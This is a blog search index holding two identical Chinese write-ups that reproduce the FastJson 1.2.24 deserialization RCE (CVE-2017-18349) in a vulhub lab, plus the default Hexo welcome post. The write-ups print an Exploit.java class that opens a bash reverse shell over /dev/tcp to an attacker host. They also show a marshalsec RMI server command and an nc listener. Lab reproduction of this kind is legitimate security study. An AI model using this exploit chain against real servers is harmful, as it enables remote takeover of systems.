<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2017-18349</title>
      <link href="/2023/02/01/fastjson1-2-24rce-fu-xian/"/>
      <url>/2023/02/01/fastjson1-2-24rce-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2017-18349-FastJson-1-2-24-反序列化漏洞RCE"><a href="#CVE-2017-18349-FastJson-1-2-24-反序列化漏洞RCE" class="headerlink" title="CVE-2017-18349 FastJson 1.2.24 反序列化漏洞RCE"></a>CVE-2017-18349 FastJson 1.2.24 反序列化漏洞RCE</h1><h2 id="0x01漏洞原理"><a href="#0x01漏洞原理" class="headerlink" title="0x01漏洞原理"></a>0x01漏洞原理</h2><pre class="line-numbers language-none"><code class="language-none">fastjson在解析json对象时，会使用autoType实例化某一个具体的类，并调用set/get方法访问属性。漏洞出现在Fastjson autoType处理json对象时，没有对@type字段进行完整的安全性验证，我们可以传入危险的类并调用危险类连接远程RMI服务器，通过恶意类执行恶意代码，进而实现远程代码执行漏洞影响版本为fastjson &lt; 1.2.25<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="0x02-漏洞环境搭建"><a href="#0x02-漏洞环境搭建" class="headerlink" title="0x02 漏洞环境搭建"></a>0x02 漏洞环境搭建</h2><p>这里用vulhub靶场的docker镜像进行，记得把java版本换成1.8.0_20<br>更换java版本：</p><pre class="line-numbers language-none"><code class="language-none">curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gztar zxvf jdk-8u20-linux-x64.tar.gzrm -rf /usr/bin/java*ln -s /opt/jdk1.8.0_20/bin/j* /usr/binjavac -versionjava -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后用docker容器启动fastjson靶场</p><p><img src="/images/1.png"></p><p>用burp抓包放到Repeater模块进行测试</p><p><img src="/images/2.png"></p><p>先用ldap协议向第三方dnslog发送数据看看会不会有回显</p><p><img src="/images/3.png"></p><p>可以看到第三方dnslog收到回显</p><p>下面就让我们来通过github上的<a href="https://github.com/mbechler/marshalsec.git">https://github.com/mbechler/marshalsec.git</a> 来构建一个RMI服务，然后再在本地开启一个web服务构造一个poc从而实现对fastjson实现RCE，话不多说，开干。</p><p>先下载marshalsec</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/mbechler/marshalsec.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后下载maven并编译marshalsec生成jar</p><pre class="line-numbers language-none"><code class="language-none">apt-get install mavenmvn clean package -DskipTests<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/4.png"></p><p>mvn编译成功</p><p>下面构建exp攻击脚本Exploit.java</p><pre class="line-numbers language-none"><code class="language-none">public class Exploit {public Exploit(){ try{            Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/192.168.52.136/6666 0&gt;&amp;1");        }catch(Exception e){            e.printStackTrace();        }    }    public static void main(String[] argv){        Exploit e = new Exploit();    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后进行javac  Exploit.java编译得到Exploit.class文件</p><p>在exp攻击脚本目录下开启一个web服务</p><p><img src="/images/5.png"></p><p>开启一个RMI服务,监听8888端口</p><pre class="line-numbers language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.52.136:8000/#Exploit" 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/6.png"></p><p>用nc开启监听6666端口</p><p><img src="/images/7.png"></p><p>burp构建发包请求</p><p><img src="/images/8.png"></p><p>RMI服务器收到请求</p><p><img src="/images/9.png"></p><p>通过exp脚本反弹给nc一个shell</p><p><img src="/images/10.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-18349</title>
      <link href="/2023/02/01/fastjson1-2-24rce-chan-qu-bang/"/>
      <url>/2023/02/01/fastjson1-2-24rce-chan-qu-bang/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2017-18349-FastJson-1-2-24-反序列化漏洞RCE"><a href="#CVE-2017-18349-FastJson-1-2-24-反序列化漏洞RCE" class="headerlink" title="CVE-2017-18349 FastJson 1.2.24 反序列化漏洞RCE"></a>CVE-2017-18349 FastJson 1.2.24 反序列化漏洞RCE</h1><h2 id="0x01漏洞原理"><a href="#0x01漏洞原理" class="headerlink" title="0x01漏洞原理"></a>0x01漏洞原理</h2><pre class="line-numbers language-none"><code class="language-none">fastjson在解析json对象时，会使用autoType实例化某一个具体的类，并调用set/get方法访问属性。漏洞出现在Fastjson autoType处理json对象时，没有对@type字段进行完整的安全性验证，我们可以传入危险的类并调用危险类连接远程RMI服务器，通过恶意类执行恶意代码，进而实现远程代码执行漏洞影响版本为fastjson &lt; 1.2.25<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="0x02-漏洞环境搭建"><a href="#0x02-漏洞环境搭建" class="headerlink" title="0x02 漏洞环境搭建"></a>0x02 漏洞环境搭建</h2><p>这里用vulhub靶场的docker镜像进行，记得把java版本换成1.8.0_20<br>更换java版本：</p><pre class="line-numbers language-none"><code class="language-none">curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gztar zxvf jdk-8u20-linux-x64.tar.gzrm -rf /usr/bin/java*ln -s /opt/jdk1.8.0_20/bin/j* /usr/binjavac -versionjava -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后用docker容器启动fastjson靶场</p><p><img src="/images/1.png"></p><p>用burp抓包放到Repeater模块进行测试</p><p><img src="/images/2.png"></p><p>先用ldap协议向第三方dnslog发送数据看看会不会有回显</p><p><img src="/images/3.png"></p><p>可以看到第三方dnslog收到回显</p><p>下面就让我们来通过github上的<a href="https://github.com/mbechler/marshalsec.git">https://github.com/mbechler/marshalsec.git</a> 来构建一个RMI服务，然后再在本地开启一个web服务构造一个poc从而实现对fastjson实现RCE，话不多说，开干。</p><p>先下载marshalsec</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/mbechler/marshalsec.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后下载maven并编译marshalsec生成jar</p><pre class="line-numbers language-none"><code class="language-none">apt-get install mavenmvn clean package -DskipTests<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/4.png"></p><p>mvn编译成功</p><p>下面构建exp攻击脚本Exploit.java</p><pre class="line-numbers language-none"><code class="language-none">public class Exploit {public Exploit(){ try{            Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/192.168.52.136/6666 0&gt;&amp;1");        }catch(Exception e){            e.printStackTrace();        }    }    public static void main(String[] argv){        Exploit e = new Exploit();    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后进行javac  Exploit.java编译得到Exploit.class文件</p><p>在exp攻击脚本目录下开启一个web服务</p><p><img src="/images/5.png"></p><p>开启一个RMI服务,监听8888端口</p><pre class="line-numbers language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.52.136:8000/#Exploit" 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/6.png"></p><p>用nc开启监听6666端口</p><p><img src="/images/7.png"></p><p>burp构建发包请求</p><p><img src="/images/8.png"></p><p>RMI服务器收到请求</p><p><img src="/images/9.png"></p><p>通过exp脚本反弹给nc一个shell</p><p><img src="/images/10.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/01/12/hello-world/"/>
      <url>/2023/01/12/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new "My New Post"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
